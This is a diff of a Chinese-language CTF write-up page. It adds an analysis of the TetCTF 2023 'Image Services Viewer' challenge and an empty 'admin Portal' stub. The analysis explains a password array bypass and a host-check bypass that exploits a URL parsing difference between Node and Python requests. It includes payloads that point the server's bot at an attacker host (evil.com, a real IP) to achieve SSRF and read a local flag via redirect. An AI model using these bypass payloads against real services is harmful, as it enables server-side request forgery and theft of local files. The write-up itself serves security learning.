@@ -55,19 +55,21 @@
 <li class="toctree-l4"><a class="reference internal" href="#id3">题目分析</a></li>
 </ul>
 </li>
+<li class="toctree-l3"><a class="reference internal" href="#admin-portal">admin Portal</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id4">题目分析</a></li>
 </ul>
 </li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#id5">参考</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
-<li class="toctree-l1"><a class="reference internal" href="tamu.html">TAMUctf 2023</a></li>
 <li class="toctree-l1"><a class="reference internal" href="nullcon-HackIM-CTF-Goa.html">nullcon HackIM CTF</a></li>
 <li class="toctree-l1"><a class="reference internal" href="CTFZone.html">CTFZone</a></li>
 <li class="toctree-l1"><a class="reference internal" href="corCTF.html">corCTF 2023</a></li>
 <li class="toctree-l1"><a class="reference internal" href="tamu.html">TAMUctf 2023</a></li>
 <li class="toctree-l1"><a class="reference internal" href="nullcon-HackIM-CTF-Goa.html">nullcon HackIM CTF</a></li>
-<li class="toctree-l1"><a class="reference internal" href="CTFZone.html">CTFZone</a></li>
-<li class="toctree-l1"><a class="reference internal" href="corCTF.html">corCTF 2023</a></li>
 </ul>
 
         </div>
@@ -152,6 +154,7 @@ Don’t generate excessive load. Scanning/Dirbust is not needed.</p>
 <span class="o">~</span><span class="mi">0</span> <span class="o">-&gt;</span> <span class="o">-</span><span class="mi">1</span>
 </pre></div>
 </div>
+<p><img alt="image-20230825201627731" src="../../_images/image-20230825201627731.png" /></p>
 </section>
 </section>
 <section id="image-services-viewer">
@@ -161,8 +164,96 @@ Don’t generate excessive load. Scanning/Dirbust is not needed.</p>
 <p>源码地址：https://drive.google.com/file/d/1K8XJXrdwEgJWGwu2V3cqLiZUo4nrdweM/view?usp=share_link</p>
 <section id="id3">
 <h4>题目分析<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
+<p>给的Dockerfile在下载镜像时会有网络问题，建议更换apt和npm的源。apt的可以用清华，npm的可以换淘宝的。</p>
+<p>以下是gpt给出的解决方案：</p>
+<div class="highlight-dockerfile notranslate"><div class="highlight"><pre><span></span><span class="k">FROM</span><span class="w"> </span><span class="s">node:14</span>
+
+<span class="k">RUN</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/usr/src/app
+
+<span class="k">RUN</span><span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/deb.debian.org/mirrors.tuna.tsinghua.edu.cn/g&#39;</span><span class="w"> </span>/etc/apt/sources.list<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s/security.debian.org/mirrors.tuna.tsinghua.edu.cn/g&#39;</span><span class="w"> </span>/etc/apt/sources.list<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>python<span class="w"> </span>python-pip
+
+<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/usr/src/app</span>
+
+<span class="k">COPY</span><span class="w"> </span>./container/images-services/src/<span class="w"> </span>.
+
+<span class="k">RUN</span><span class="w"> </span>npm<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>registry<span class="w"> </span>https://registry.npm.taobao.org
+<span class="k">RUN</span><span class="w"> </span>npm<span class="w"> </span>install
+<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-i<span class="w"> </span>https://pypi.tuna.tsinghua.edu.cn/simple<span class="w"> </span>requests
+
+<span class="k">COPY</span><span class="w"> </span>./container/images-services/flag.txt<span class="w"> </span>/usr/src/app/fl4gg_tetCTF
+
+<span class="k">EXPOSE</span><span class="w"> </span><span class="s">3000</span>
+
+<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;index.js&quot;</span><span class="w"> </span><span class="p">]</span>
+</pre></div>
+</div>
+<p><img alt="image-20230825202427356" src="../../_images/image-20230825202427356.png" /></p>
+<p>三个目录以及docker的yaml还有两个启动脚本，官方说了有两个题是同一个附件，分别有两个flag。根据现在的题目名明显我们需要关注 images-services 这个目录。</p>
+<p>首先观察一下该目录的 dockerfile，因为这能让我了解题目的基本业务逻辑。</p>
+<div class="highlight-dockfile notranslate"><div class="highlight"><pre><span></span>COPY ./container/images-services/flag.txt /usr/src/app/fl4gg_tetCTF
+
+EXPOSE 3000
+
+CMD [ &quot;node&quot;, &quot;index.js&quot; ]
+</pre></div>
+</div>
+<p>flag在容器当前工作目录下的fl4gg_tetCTF，入口文件是 index.js。那现在就去看一下这个文件。看完这个文件后，感觉有问题的点在于：</p>
+<p><img alt="image-20230825205649854" src="../../_images/image-20230825205649854.png" /></p>
+<p>此处题目已经暗示我们url和flag有关系了，又是host、又是url的，很容易让人想起SSRF，我的首要想法是通过SSRF读取服务端本地的flag。但是还是要看看downloadImage()函数做了什么。</p>
+<p><img alt="image-20230825205856905" src="../../_images/image-20230825205856905.png" /></p>
+<p>以我们传入的url为参数执行命令</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">bot</span><span class="o">.</span><span class="n">py</span> <span class="n">url</span>
+</pre></div>
+</div>
+<p>现在跟进去看看bot.py，注释告诉我们这是一个处理本地请求的文件，可以接受 file:// 这样的url。看到这里很自然的想法就是利用 fie 协议读取 flag。然而，题目利用了好几个函数对请求进行了过滤的，所以必须观察利用file协议读flag会不会触发过滤函数。</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">isAdmin()</span></code> 要求password=Th!sIsS3xreT0但是长度又不能超过12，将password改成数组传入即可。</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>password[]=Th!sIsS3xreT0
+</pre></div>
+</div>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">valite()</span></code>要求请求体的值的类型必须是String或Number，同时值不可以包含一些黑名单字符，看了一眼没有file://以及和flag路径相关的，非常nice！</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">IsValidProtocol()</span></code> 结合源码要求url只能是http或者https。很难搞，似乎无法用fie协议了？</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">isValidHost()</span></code>限制host必须是i.ibb.co</p></li>
+<li><p>bot.py请求的时候要求后缀名是图片、响应的Content-Type是image，第一个我想到的是在路径后拼接<code class="docutils literal notranslate"><span class="pre">#.jpg</span></code>绕过，第二个除非我有可控的服务器并且host还是i.ibb.co才能做到。</p></li>
+</ul>
+<p>最关键的点在于如何绕过host的限制？目标当然是将 host 弄成一个我们可控的服务器。这里可以利用 node 和 python 对 host 的解析差异来绕过。</p>
+<p>在bot.py中会调用requests的head和get方法，在调用过程中会调用到urllib3的Url类的parse_url方法，该方法对于url的解析和题目urlParse类对url的解析存在差异。</p>
+<p><img alt="image-20230826212134778" src="../../_images/image-20230826212134778.png" /></p>
+<p><img alt="image-20230826212158735" src="../../_images/image-20230826212158735.png" /></p>
+<p><img alt="image-20230826212221336" src="../../_images/image-20230826212221336.png" /></p>
+<p>如上图，authority不匹配反斜杠，path除了问号和井号都匹配。所以对于 <code class="docutils literal notranslate"><span class="pre">http://evil.com1232\&#64;i.ibb.co/1.png</span></code></p>
+<p>，requests解析的authority是<code class="docutils literal notranslate"><span class="pre">http://evil.com1232</span></code>，path是<code class="docutils literal notranslate"><span class="pre">\&#64;i.ibb.co/1.png</span></code>。</p>
+<p><img alt="image-20230826212743900" src="../../_images/image-20230826212743900.png" /></p>
+<p>对于urlParse来说，其解析出来的结果是</p>
+<p><img alt="image-20230826213023403" src="../../_images/image-20230826213023403.png" /></p>
+<p>关于url的具体组成，可以参看<a class="reference external" href="https://en.wikipedia.org/wiki/URL">维基百科</a>的图：</p>
+<p><img alt="URI syntax diagram" src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/URI_syntax_diagram.svg/1068px-URI_syntax_diagram.svg.png" /></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">URI</span> <span class="o">=</span> <span class="n">scheme</span> <span class="s2">&quot;:&quot;</span> <span class="p">[</span><span class="s2">&quot;//&quot;</span> <span class="n">authority</span><span class="p">]</span> <span class="n">path</span> <span class="p">[</span><span class="s2">&quot;?&quot;</span> <span class="n">query</span><span class="p">]</span> <span class="p">[</span><span class="s2">&quot;#&quot;</span> <span class="n">fragment</span><span class="p">]</span>
+<span class="n">authority</span> <span class="o">=</span> <span class="p">[</span><span class="n">userinfo</span> <span class="s2">&quot;@&quot;</span><span class="p">]</span> <span class="n">host</span> <span class="p">[</span><span class="s2">&quot;:&quot;</span> <span class="n">port</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>利用这种解析差异，将host弄成我们可控的服务器，然后在服务器上定义302跳转读取本地的flag，这就完成了一次优雅的ssrf。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">47.115.222.18</span>\<span class="nd">@i</span><span class="o">.</span><span class="n">ibb</span><span class="o">.</span><span class="n">cotest</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">jpg</span>
+</pre></div>
+</div>
 </section>
 </section>
+<section id="admin-portal">
+<h3>admin Portal<a class="headerlink" href="#admin-portal" title="Permalink to this heading"></a></h3>
+<p><strong>题目描述</strong></p>
+<section id="id4">
+<h4>题目分析<a class="headerlink" href="#id4" title="Permalink to this heading"></a></h4>
+</section>
+</section>
+</section>
+<section id="id5">
+<h2>参考<a class="headerlink" href="#id5" title="Permalink to this heading"></a></h2>
+<p><a class="reference external" href="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/#Part1">TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE) | Y4tacker’s Blog</a></p>
 </section>
 </section>
 
